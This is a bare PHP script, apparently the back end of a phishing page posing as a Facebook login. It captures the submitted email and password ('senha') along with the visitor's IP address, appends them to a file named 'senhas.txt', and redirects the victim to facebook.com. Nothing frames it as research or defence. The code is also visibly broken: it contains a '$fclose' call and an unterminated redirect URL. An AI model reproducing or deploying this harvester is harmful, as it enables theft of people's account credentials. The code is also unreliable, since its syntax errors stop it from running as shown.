<?php
$usuario = $_POST['email'];
$senha = $_POST['senha'];
$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "Email: ".$usuario." - Senha: ".$senha." - IP: ".$ip."<br>";
 
$fp = fopen("senhas.txt", "a");
fwrite($fp, $tudo);
$fclose($fp);
header("Location: http://www.facebook.com/%22);
?>